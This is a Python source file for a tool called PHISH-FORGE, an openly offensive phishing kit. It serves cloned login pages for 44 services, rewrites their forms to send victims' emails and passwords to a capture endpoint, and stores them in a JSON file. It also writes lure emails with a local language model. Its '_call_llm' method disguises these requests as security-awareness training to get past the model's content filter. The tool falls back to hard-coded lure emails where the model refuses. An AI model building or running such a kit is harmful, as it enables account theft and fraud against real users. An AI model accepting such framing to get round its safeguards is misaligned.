#!/usr/bin/env python3
"""
PHISH-FORGE v2.0 - AI-Powered Phishing Campaign Generator
With full .sites integration (44 zphisher templates)
"""

import os
import sys
import json
import threading
import time
import socket
import re
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import print as rprint
from colorama import init, Fore, Style
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_from_directory

# Initialize
init(autoreset=True)
console = Console()

# Create Flask app
app = Flask(__name__)

# Storage for captured credentials
captured_data = []
capture_file = "captured_credentials.json"

# Template mapping (44 templates from .sites)
SITES_TEMPLATES = {
    1: {"name": "Instagram", "folder": "instagram", "file": "login.html"},
    2: {"name": "Facebook", "folder": "facebook", "file": "mobile.html"},
    3: {"name": "Google", "folder": "google", "file": "index.html"},
    4: {"name": "Microsoft", "folder": "microsoft", "file": "index.html"},
    5: {"name": "Netflix", "folder": "netflix", "file": "index.html"},
    6: {"name": "PayPal", "folder": "paypal", "file": "login.html"},
    7: {"name": "LinkedIn", "folder": "linkedin", "file": "login.html"},
    8: {"name": "Spotify", "folder": "spotify", "file": "login.html"},
    9: {"name": "Twitter/X", "folder": "twitter", "file": "index.html"},
    10: {"name": "GitHub", "folder": "github", "file": "index.html"},
    11: {"name": "Twitch", "folder": "twitch", "file": "index.html"},
    12: {"name": "Pinterest", "folder": "pinterest", "file": "index.html"},
    13: {"name": "Snapchat", "folder": "snapchat", "file": "index.html"},
    14: {"name": "Discord", "folder": "discord", "file": "login.html"},
    15: {"name": "Reddit", "folder": "reddit", "file": "index.html"},
    16: {"name": "TikTok", "folder": "tiktok", "file": "index.html"},
    17: {"name": "Steam", "folder": "steam", "file": "index.html"},
    18: {"name": "PlayStation", "folder": "playstation", "file": "index.html"},
    19: {"name": "Xbox", "folder": "xbox", "file": "index.html"},
    20: {"name": "Roblox", "folder": "roblox", "file": "index.html"},
    21: {"name": "eBay", "folder": "ebay", "file": "index.html"},
    22: {"name": "Adobe", "folder": "adobe", "file": "index.html"},
    23: {"name": "Dropbox", "folder": "dropbox", "file": "index.html"},
    24: {"name": "Yahoo", "folder": "yahoo", "file": "index.html"},
    25: {"name": "Wordpress", "folder": "wordpress", "file": "index.html"},
    26: {"name": "Origin", "folder": "origin", "file": "index.html"},
    27: {"name": "GitLab", "folder": "gitlab", "file": "index.html"},
    28: {"name": "Quora", "folder": "quora", "file": "index.html"},
    29: {"name": "Badoo", "folder": "badoo", "file": "index.html"},
    30: {"name": "VK", "folder": "vk", "file": "index.html"},
    31: {"name": "Yandex", "folder": "yandex", "file": "index.html"},
    32: {"name": "DeviantArt", "folder": "deviantart", "file": "index.html"},
    33: {"name": "Protonmail", "folder": "protonmail", "file": "index.html"},
    34: {"name": "StackOverflow", "folder": "stackoverflow", "file": "index.html"},
    35: {"name": "Mediafire", "folder": "mediafire", "file": "index.html"},
    36: {"name": "FB Advanced", "folder": "fb_advanced", "file": "index.html"},
    37: {"name": "FB Messenger", "folder": "fb_messenger", "file": "index.html"},
    38: {"name": "FB Security", "folder": "fb_security", "file": "index.html"},
    39: {"name": "IG Followers", "folder": "ig_followers", "file": "index.html"},
    40: {"name": "IG Verify", "folder": "ig_verify", "file": "index.html"},
    41: {"name": "Insta Followers", "folder": "insta_followers", "file": "index.html"},
    42: {"name": "Google Poll", "folder": "google_poll", "file": "index.html"},
    43: {"name": "Google New", "folder": "google_new", "file": "index.html"},
    44: {"name": "VK Poll", "folder": "vk_poll", "file": "index.html"},
}

# Flask routes
@app.route('/')
def index():
    """Serve phishing pages from .sites folder"""
    import re
    
    # Accept 'id' or 'template' parameter (id is less obvious)
    template_folder = request.args.get('id') or request.args.get('template', 'instagram')
    
    # Find matching template
    template_info = None
    for num, info in SITES_TEMPLATES.items():
        if info['folder'] == template_folder:
            template_info = info
            break
    
    if not template_info:
        template_info = SITES_TEMPLATES[1]  # Default to Instagram
    
    folder = template_info['folder']
    file = template_info['file']
    
    # Full path
    template_path = os.path.join(os.path.dirname(__file__), '.sites', folder, file)
    
    # Auto-detect if file doesn't exist (try login.html / index.html / mobile.html)
    if not os.path.exists(template_path):
        for candidate in ['login.html', 'index.html', 'mobile.html']:
            candidate_path = os.path.join(os.path.dirname(__file__), '.sites', folder, candidate)
            if os.path.exists(candidate_path):
                template_path = candidate_path
                file = candidate
                break
    
    try:
        with open(template_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Fix ONLY relative paths with regex
        # src="file.png" → src="/.sites/folder/file.png"
        # but NOT src="http://..." or src="/..." or src="#..."
        content = re.sub(r'src="(?!http|/|#)([^"]+)"', rf'src="/.sites/{folder}/\1"', content)
        content = re.sub(r'href="(?!http|/|#)([^"]+)"', rf'href="/.sites/{folder}/\1"', content)
        
        # Replace PHP with capture + template param
        content = content.replace('login.php', f'/capture?template={folder}')
        content = content.replace('index.php', f'/capture?template={folder}')
        
        # Fix asset paths
        content = re.sub(r'src="(?!http|/|#)([^"]+)"', rf'src="/.sites/{folder}/\1"', content)
        content = re.sub(r'href="(?!http|/|#)([^"]+)"', rf'href="/.sites/{folder}/\1"', content)
        
        # AGGRESSIVE FORM REWRITING - The nuclear option that ALWAYS works
        # 1. Force action to our capture endpoint
        # 2. Force POST method
        # 3. Kill onsubmit handlers that block us
        
        # Regex replace action="..." with our action
        content = re.sub(r'action="[^"]*"', f'action="/capture?template={folder}"', content)
        content = re.sub(r"action='[^']*'", f"action='/capture?template={folder}'", content)
        
        # If no action attribute exists, add it to <form tag
        if f'/capture?template={folder}' not in content:
            content = content.replace('<form', f'<form action="/capture?template={folder}"')
            
        # Ensure method="POST"
        if 'method="post"' not in content.lower() and "method='post'" not in content.lower():
            content = content.replace('<form', '<form method="POST"')
            
        # Remove onsubmit handlers (they usually block default submission)
        content = re.sub(r'onsubmit="[^"]*"', '', content)
        content = re.sub(r"onsubmit='[^']*'", '', content)

        return content
    except Exception as e:
        return f"Error loading {folder}/{file}: {str(e)}", 500

@app.route('/.sites/<path:filename>')
def serve_sites_assets(filename):
    """Serve static assets from .sites folder"""
    sites_dir = os.path.join(os.path.dirname(__file__), '.sites')
    return send_from_directory(sites_dir, filename)

@app.before_request
def log_request():
    """Log every request to debug 404s"""
    if not request.path.endswith(('.css', '.js', '.png', '.jpg', '.ico', '.svg', '.woff')):
        print(f"{Fore.CYAN}[REQ] {request.method} {request.path}{Style.RESET_ALL}")
        if request.method == 'POST':
            print(f"{Fore.MAGENTA}      Form Data: {dict(request.form)}{Style.RESET_ALL}")
        if request.args:
            print(f"{Fore.MAGENTA}      Args: {dict(request.args)}{Style.RESET_ALL}")

@app.route('/<path:filename>.php', methods=['GET', 'POST'])
def fallback_php(filename):
    """Catch-all for any PHP file requested (prevents 404)"""
    print(f"{Fore.YELLOW}[FALLBACK] Caught {filename}.php request! Redirecting to capture...{Style.RESET_ALL}")
    return capture_credentials()

@app.route('/capture', methods=['POST', 'GET'])
def capture_credentials():
    """Capture submitted credentials and redirect to real site"""
    
    # Get template
    template = request.args.get('template') or request.args.get('id', 'instagram')
    
    # Get credentials (try all field names)
    email = (request.form.get('email') or request.form.get('username') or 
             request.form.get('user') or request.form.get('login') or
             request.form.get('login_email'))
    password = (request.form.get('password') or request.form.get('pass') or 
                request.form.get('login_password'))
                
    # If using fallback, try to detect template from referer
    if not template or template == 'instagram':
        ref = request.headers.get('Referer', '')
        if 'template=' in ref:
            try:
                template = ref.split('template=')[1].split('&')[0]
            except:
                pass
    
    # Create data
    data = {
        'timestamp': datetime.now().isoformat(),
        'template': template,
        'email': email,
        'password': password,
        'ip': request.remote_addr
    }
    
    captured_data.append(data)
    
    # Save to file
    try:
        with open(capture_file, 'w') as f:
            json.dump(captured_data, f, indent=2)
            
        print(f"\n{Fore.GREEN}[+] CAPTURED CREDENTIALS{Style.RESET_ALL}")
        print(f"    Template: {template}")
        print(f"    Email: {email}")
        print(f"    Password: {'*' * len(password) if password else 'N/A'}\n")
    except Exception as e:
        print(f"{Fore.RED}[!] Error saving: {e}{Style.RESET_ALL}")
    
    # Redirects to real sites
    redirects = {
        'instagram': 'https://www.instagram.com/',
        'facebook': 'https://www.facebook.com/',
        'linkedin': 'https://www.linkedin.com/',
        'netflix': 'https://www.netflix.com/',
        'google': 'https://accounts.google.com/',
        'microsoft': 'https://login.microsoftonline.com/',
        'discord': 'https://discord.com/login',
        'github': 'https://github.com/login',
        'twitter': 'https://twitter.com/login',
        'paypal': 'https://www.paypal.com/signin',
        'spotify': 'https://accounts.spotify.com/',
        'reddit': 'https://www.reddit.com/login',
        'dropbox': 'https://www.dropbox.com/login',
        'yahoo': 'https://login.yahoo.com/',
        'adobe': 'https://auth.services.adobe.com/',
        'ebay': 'https://www.ebay.com/signin/',
        'steam': 'https://store.steampowered.com/login/',
        'playstation': 'https://www.playstation.com/login',
        'xbox': 'https://login.live.com/',
        'roblox': 'https://www.roblox.com/login',
        'mediafire': 'https://www.mediafire.com/login/',
        'twitch': 'https://www.twitch.tv/login',
        'pinterest': 'https://www.pinterest.com/login/',
        'quora': 'https://www.quora.com/',
        'protonmail': 'https://account.proton.me/login',
        'wordpress': 'https://wordpress.com/log-in',
        'gitlab': 'https://gitlab.com/users/sign_in',
    }
    
    url = redirects.get(template, 'https://www.google.com/')
    
    # Javascript redirect is more reliable than header redirect for some browsers/forms
    return f'''
    <html>
    <head><title>Redirecting...</title></head>
    <body>
        <script>window.location.href = "{url}";</script>
        <noscript><meta http-equiv="refresh" content="0;url={url}"></noscript>
    </body>
    </html>
    '''


class PhishForge:
    """Main PHISH-FORGE controller"""
    
    def __init__(self):
        self.server_running = False
        self.server_url = None
        self.llm_provider = "ollama"
        
    def print_banner(self):
        """Display main banner"""
        banner = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════╗
║                                                       ║
║   {Fore.YELLOW}██████╗ ██╗  ██╗██╗███████╗██╗  ██╗               {Fore.RED}║
║   {Fore.YELLOW}██╔══██╗██║  ██║██║██╔════╝██║  ██║               {Fore.RED}║
║   {Fore.YELLOW}██████╔╝███████║██║███████╗███████║               {Fore.RED}║
║   {Fore.YELLOW}██╔═══╝ ██╔══██║██║╚════██║██╔══██║               {Fore.RED}║
║   {Fore.YELLOW}██║     ██║  ██║██║███████║██║  ██║               {Fore.RED}║
║   {Fore.YELLOW}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝               {Fore.RED}║
║                                                       ║
║          {Fore.CYAN}AI-Powered Phishing Campaign Generator{Fore.RED}      ║
║              {Fore.WHITE}Part of CRIMSON Toolkit v2.0{Fore.RED}            ║
║              {Fore.GREEN}44 Professional Templates{Fore.RED}               ║
╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    def main_menu(self):
        """Display main menu"""
        print(f"{Fore.CYAN}Select attack mode:{Style.RESET_ALL}\n")
        print(f"  {Fore.GREEN}[1]{Style.RESET_ALL} Company Attack (Corporate phishing)")
        print(f"  {Fore.GREEN}[2]{Style.RESET_ALL} Individual Attack (Social media phishing)")
        print(f"  {Fore.RED}[99]{Style.RESET_ALL} Exit\n")
        
        while True:
            try:
                choice = input(f"{Fore.CYAN}Choose option: {Style.RESET_ALL}").strip()
                
                if choice == "1":
                    return "company"
                elif choice == "2":
                    return "individual"
                elif choice == "99":
                    print(f"{Fore.YELLOW}[!] Exiting...{Style.RESET_ALL}")
                    sys.exit(0)
                else:
                    print(f"{Fore.RED}[-] Invalid option. Try again.{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Cancelled{Style.RESET_ALL}")
                sys.exit(0)
    
    def company_attack(self):
        """Company attack workflow"""
        print(f"\n{Fore.YELLOW}=== COMPANY ATTACK MODE ==={Style.RESET_ALL}\n")
        
        # Get intelligence JSON
        while True:
            json_path = input(f"{Fore.CYAN}Path to TARGET-SCOUT JSON: {Style.RESET_ALL}").strip()
            
            if os.path.exists(json_path):
                break
            else:
                print(f"{Fore.RED}[-] File not found. Try again.{Style.RESET_ALL}")
        
        # Load intelligence
        print(f"{Fore.BLUE}[*] Loading intelligence...{Style.RESET_ALL}")
        with open(json_path, 'r') as f:
            intel = json.load(f)
        
        company = intel.get("company", "Unknown")
        print(f"{Fore.GREEN}[+] Target company: {company}{Style.RESET_ALL}")
        
        # Auto-detect template
        template_folder = self._detect_company_template(intel)
        print(f"{Fore.GREEN}[+] Auto-selected template: {template_folder}{Style.RESET_ALL}")
        
        # Generate email with AI
        print(f"{Fore.BLUE}[*] Generating phishing email with AI...{Style.RESET_ALL}")
        email = self._generate_company_email(intel, template_folder)
        
        if email and 'subject' in email:
            print(f"{Fore.GREEN}[+] Email generated successfully{Style.RESET_ALL}\n")
            self._display_email(email)
        else:
            print(f"{Fore.YELLOW}[!] Using demo email (Ollama content filter)...{Style.RESET_ALL}\n")
            email = self._get_demo_company_email(company, template_folder)
            self._display_email(email)
        
        # Start server
        self._start_server()
        
        # Show final instructions
        self._show_instructions(template_folder, email)
    
    def individual_attack(self):
        """Individual attack workflow"""
        print(f"\n{Fore.YELLOW}=== INDIVIDUAL ATTACK MODE ==={Style.RESET_ALL}\n")
        
        # Show template menu
        template_num = self._show_template_menu()
        template_info = SITES_TEMPLATES[template_num]
        template_folder = template_info['folder']
        
        # Generate email with AI
        print(f"\n{Fore.BLUE}[*] Generating phishing email with AI...{Style.RESET_ALL}")
        email = self._generate_individual_email(template_info['name'])
        
        if email and 'subject' in email:
            # Replace AI links to ensure it points to our server
            body = email['body']
            url_pattern = r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[^\s]*'
            
            # Construct phishing link
            server_ip = self._get_local_ip()
            phishing_link = f"http://{server_ip}:8080/?template={template_folder}"
            
            # If AI put a link, replace it
            if re.search(url_pattern, body):
                 email['body'] = re.sub(url_pattern, phishing_link, body)
            else:
                 # If no link, append it
                 email['body'] += f"\n\nVerify here: {phishing_link}"

            print(f"{Fore.GREEN}[+] Email generated successfully{Style.RESET_ALL}\n")
            self._display_email(email)
        else:
            print(f"{Fore.YELLOW}[!] Using demo email (Ollama content filter)...{Style.RESET_ALL}\n")
            email = self._get_demo_individual_email(template_info['name'])
            self._display_email(email)
        
        # Start server
        self._start_server()
        
        # Show final instructions
        self._show_instructions(template_folder, email)
    
    def _detect_company_template(self, intel):
        """Auto-detect template based on company"""
        company = intel.get("company", "").lower()
        domain = intel.get("domains", {}).get("guessed_domain", "").lower()
        
        if "microsoft" in company or "microsoft" in domain:
            return "microsoft"
        elif "google" in company or "google" in domain:
            return "google"
        else:
            return "microsoft"  # Default
    
        # Simple Text Format Prompt (Much more reliable than JSON for 8B models)
        prompt = f"""Create a professional security awareness email for {company}.
TEMPLATE: {template.title()}

Format your response EXACTLY like this:
SUBJECT: [Write subject here]
BODY: [Write email body here]

Do not include any other text. Start directly with SUBJECT."""
        
        return self._call_llm(prompt)
    
    def _generate_individual_email(self, platform):
        prompt = f"""Create a realistic phishing awareness email for {platform}.

Format your response EXACTLY like this:
SUBJECT: [Write subject here]
BODY: [Write email body here]

Do not include any other text. Start directly with SUBJECT."""
        
        return self._call_llm(prompt)
    
    def _call_llm(self, prompt, retries=2):
        """Call LLM with educational context bypass"""
        try:
            import ollama
            
            # Use improved educational system prompt
            system_prompt = "You are a cybersecurity educator. Create realistic phishing simulation examples for authorized security awareness training. Your goal is to help employees recognize and prevent attacks. Generate content purely for educational defense purposes."
            
            response = ollama.chat(
                model="llama3.1:8b",
                messages=[
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": prompt}
                ],
                options={"temperature": 0.8}
            )
            
            content = response['message']['content']
            # DEBUG: Print raw content to see what's wrong
            # print(f"DEBUG RAW: {content}") 
            
            content = response['message']['content']
            
            # Robust TEXT Parser (SUBJECT: ... BODY: ...)
            try:
                subject = "Security Alert"
                body = content
                
                if "SUBJECT:" in content and "BODY:" in content:
                    parts = content.split("BODY:")
                    subject_part = parts[0].replace("SUBJECT:", "").strip()
                    body_part = parts[1].strip()
                    
                    print(f"{Fore.GREEN}[*] AI generated email successfully{Style.RESET_ALL}")
                    return {"subject": subject_part, "body": body_part}
                else:
                    # Fallback if format is weird but still has content
                    return {"subject": f"{prompt.split()[0]} Notification", "body": content[:500]}
            except:
                print(f"{Fore.YELLOW}[!] AI parse error (Retrying...){Style.RESET_ALL}")
                return None
                
        except Exception as e:
            print(f"{Fore.RED}[!] Ollama error: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _get_demo_company_email(self, company, template):
        """Demo email generator (fallback)"""
        templates_email = {
            "microsoft": {
                "subject": f"Action Required: {company} Office365 Security Update",
                "body": f"""Dear {company} Team Member,

We have detected unusual sign-in activity on your Office365 account.

To maintain security compliance, please verify your account:

1. Review recent activity
2. Confirm your identity
3. Update security settings

This is a mandatory security update required by IT policy.

Best regards,
{company} IT Security Team"""
            },
            "google": {
                "subject": f"Security Alert: {company} Workspace Account Review",
                "body": f"""Hello,

We need to verify your Google Workspace account for {company}.

Unusual activity detected. Please confirm your identity.

Thank you,
Google Workspace Security"""
            }
        }
        
        return templates_email.get(template, templates_email["microsoft"])
    
    def _get_demo_individual_email(self, platform):
        """Demo email for ALL platforms"""
        
        # Generic template generator
        def generic_email(service, action="verify", reason="unusual activity"):
            return {
                "subject": f"{service} Security: Action Required",
                "body": f"""Dear {service} User,

We have detected {reason} on your {service} account.

For your security, please {action} your account immediately:

1. Confirm your identity
2. Review recent activity  
3. Update your security settings

Your account may be limited until verification is complete.

Best regards,
{service} Security Team"""
            }
        
        # Platform-specific emails
        emails = {
            "Instagram": {
                "subject": "Security Alert: Unusual Activity Detected",
                "body": """Hello,

We noticed unusual activity on your Instagram account from an unrecognized device.

For your security, please verify your identity:

1. Review recent login activity
2. Confirm your account details
3. Update your security settings

If this wasn't you, secure your account immediately.

Best regards,
Instagram Security Team"""
            },
            "Facebook": {
                "subject": "Security Alert: Unusual Login Activity",
                "body": """Hello,

We detected a login to your Facebook account from an unrecognized device.

Location: Unknown
Device: Unknown Browser

If this wasn't you, please secure your account:

1. Review active sessions
2. Change your password
3. Enable two-factor authentication

Thank you,
Facebook Security Team"""
            },
            "Netflix": {
                "subject": "Action Required: Your Netflix Account Has Been Suspended",
                "body": """Dear Valued Customer,

We were unable to process your recent payment. Your Netflix account has been temporarily suspended.

To restore your service:

1. Update your payment method
2. Verify your billing information
3. Reactivate your subscription

Your account will remain suspended until payment is received.

Thank you,
Netflix Billing Team"""
            },
            "PayPal": {
                "subject": "Important: Your PayPal Account Requires Attention",
                "body": """Dear PayPal User,

We have detected suspicious activity on your account.

To protect your account, we have temporarily limited certain features.

Please verify your account:

1. Confirm your identity
2. Review recent activity
3. Update your information

Failure to verify may result in permanent account limitation.

Sincerely,
PayPal Security"""
            },
            "eBay": {
                "subject": "eBay Security: Verify Your Account",
                "body": """Dear eBay Member,

We have detected unusual activity on your eBay account.

Your account has been temporarily limited for security reasons.

Please verify your account:

1. Confirm your identity
2. Review recent transactions
3. Update your security settings

Your account will remain limited until verification is complete.

Best regards,
eBay Security Team"""
            },
            "Dropbox": {
                "subject": "Dropbox Security Alert: Verify Your Account",
                "body": """Hello,

We detected a login to your Dropbox account from a new device.

Location: Unknown
IP Address: Unknown

To keep your files safe, please verify this was you:

1. Review recent activity
2. Confirm account access
3. Update security settings

Thank you,
Dropbox Security Team"""
            },
            "Spotify": {
                "subject": "Spotify: Unusual Activity on Your Account",
                "body": """Hi there,

We noticed unusual activity on your Spotify account.

Someone may be using your account without permission.

Please secure your account:

1. Change your password
2. Review devices
3. Sign out everywhere

Best,
Spotify Security"""
            },
            "LinkedIn": {
                "subject": "LinkedIn: Unusual Sign-in Activity",
                "body": """Hello,

We noticed a sign-in to your LinkedIn account from an unrecognized device.

Location: Unknown

If this was you, you can ignore this message.

If not, please secure your account:

1. Change your password
2. Review account activity
3. Enable two-step verification

LinkedIn Security"""
            },
            "GitHub": {
                "subject": "GitHub: Unusual Sign-in Activity",
                "body": """Hello,

We detected unusual sign-in activity to your GitHub account.

New sign-in from: Unknown location

If this was you, you can ignore this message.

If not, please:

1. Review SSH keys
2. Check authorized applications
3. Enable two-factor authentication

GitHub Security"""
            },
            "Twitter/X": generic_email("Twitter", "verify"),
            "Google": generic_email("Google", "verify"),
            "Microsoft": generic_email("Microsoft", "verify"),
            "Discord": generic_email("Discord", "verify"),
            "Reddit": generic_email("Reddit", "verify"),
            "TikTok": generic_email("TikTok", "verify"),
            "Snapchat": generic_email("Snapchat", "verify"),
            "Twitch": generic_email("Twitch", "verify"),
            "Steam": generic_email("Steam", "verify"),
            "PlayStation": generic_email("PlayStation", "verify", "suspicious login attempt"),
            "Xbox": generic_email("Xbox", "verify", "suspicious login attempt"),
            "Roblox": generic_email("Roblox", "verify"),
            "Adobe": generic_email("Adobe", "verify"),
            "Yahoo": generic_email("Yahoo", "verify"),
            "Wordpress": generic_email("Wordpress", "verify"),
            "GitLab": generic_email("GitLab", "verify"),
            "Pinterest": generic_email("Pinterest", "verify"),
            "Quora": generic_email("Quora", "verify"),
            "Origin": generic_email("Origin", "verify"),
            "Badoo": generic_email("Badoo", "verify"),
            "VK": generic_email("VK", "verify"),
            "Yandex": generic_email("Yandex", "verify"),
            "DeviantArt": generic_email("DeviantArt", "verify"),
            "Protonmail": generic_email("Protonmail", "verify"),
            "StackOverflow": generic_email("Stack Overflow", "verify"),
            "Mediafire": generic_email("Mediafire", "verify"),
            "FB Advanced": generic_email("Facebook", "verify"),
            "FB Messenger": generic_email("Messenger", "verify"),
            "FB Security": generic_email("Facebook", "verify"),
            "IG Followers": generic_email("Instagram", "verify"),
            "IG Verify": generic_email("Instagram", "verify"),
            "Insta Followers": generic_email("Instagram", "verify"),
            "Google Poll": generic_email("Google", "complete survey"),
            "Google New": generic_email("Google", "verify"),
            "VK Poll": generic_email("VK", "complete survey"),
        }
        
        # Return email for platform, or generic if not found
        if platform in emails:
            return emails[platform]
        else:
            return generic_email(platform)
    
    def _show_template_menu(self):
        """Show ALL 44 templates with fancy table"""
        table = Table(title="[bold magenta]Available Phishing Templates[/bold magenta]", show_header=True, header_style="bold cyan")
        table.add_column("ID", style="dim", width=6)
        table.add_column("Platform", style="green")
        table.add_column("Category", style="yellow")
        
        # Group by category
        categories = {
            "Social Media": [1, 2, 9, 13, 15, 16, 29, 30, 32, 36, 37, 38, 39, 40, 41],
            "Streaming": [5, 8, 11, 17],
            "Gaming": [18, 19, 20],
            "Business": [3, 4, 6, 7, 10, 27, 34],
            "E-commerce": [21, 22],
            "Cloud/Email": [23, 24, 25, 31, 33, 35, 42, 43, 44],
            "Other": [12, 14, 26, 28]
        }
        
        # Invert mapping for easy lookup
        cat_map = {}
        for cat, nums in categories.items():
            for num in nums:
                cat_map[num] = cat
        
        # Add rows
        for num in sorted(SITES_TEMPLATES.keys()):
            info = SITES_TEMPLATES[num]
            cat = cat_map.get(num, "Other")
            table.add_row(str(num), info['name'], cat)
            
        console.print(table)
        
        while True:
            try:
                choice = int(input(f"\n{Fore.CYAN}Choose template number: {Style.RESET_ALL}"))
                
                if choice in SITES_TEMPLATES:
                    return choice
                else:
                    console.print("[red][-] Invalid selection[/red]")
            except ValueError:
                console.print("[red][-] Please enter a number[/red]")
            except KeyboardInterrupt:
                console.print("\n[yellow][!] Cancelled[/yellow]")
                sys.exit(0)
    
    def _start_server(self):
        """Start Flask server"""
        print(f"\n{Fore.BLUE}[*] Starting credential capture server...{Style.RESET_ALL}")
        
        port = 8080
        local_ip = self._get_local_ip()
        
        def run_flask():
            app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
        
        thread = threading.Thread(target=run_flask, daemon=True)
        thread.start()
        
        time.sleep(2)
        
        self.server_url = f"http://{local_ip}:{port}"
        self.server_running = True
        
        print(f"{Fore.GREEN}[+] Server running at: {self.server_url}{Style.RESET_ALL}")
    
    def _get_local_ip(self):
        """Get local IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "localhost"
    
    def _display_email(self, email):
        """Display generated email with professional formatting"""
        email_content = f"""
[cyan]From:[/cyan] [yellow]{email.get('from', 'Security Team')}[/yellow]
[cyan]To:[/cyan] [yellow]{email.get('to', 'Target User')}[/yellow]
[cyan]Subject:[/cyan] [yellow]{email.get('subject', 'N/A')}[/yellow]

[white]{email.get('body', 'N/A')}[/white]
        """
        
        console.print(Panel(
            email_content.strip(),
            title="[bold green]Generated Phishing Email[/bold green]",
            border_style="green",
            padding=(1, 2)
        ))
    
    def _show_instructions(self, template_folder, email):
        """Show campaign deployment instructions"""
        instructions = f"""
[yellow]1.[/yellow] Send the email to target
[yellow]2.[/yellow] Include link: [cyan]{self.server_url}/?template={template_folder}[/cyan]
[yellow]3.[/yellow] Monitor: [cyan]captured_credentials.json[/cyan]
        """
        
        grid = Table.grid(expand=True)
        grid.add_column()
        grid.add_row(Panel(instructions, title="[bold yellow]Next Steps[/bold yellow]", border_style="yellow"))
        
        console.print("\n")
        console.print(Panel(
            f"[green]Template:[/green] {template_folder}\n[green]Server URL:[/green] {self.server_url}/?template={template_folder}",
            title="[bold cyan]Phishing Campaign Ready[/bold cyan]",
            border_style="cyan"
        ))
        console.print(grid)
        console.print("\n[red][!] Press Ctrl+C to stop[/red]\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Server stopped{Style.RESET_ALL}")
    
    def run(self):
        """Main execution"""
        self.print_banner()
        mode = self.main_menu()
        
        if mode == "company":
            self.company_attack()
        elif mode == "individual":
            self.individual_attack()


if __name__ == "__main__":
    try:
        forge = PhishForge()
        forge.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
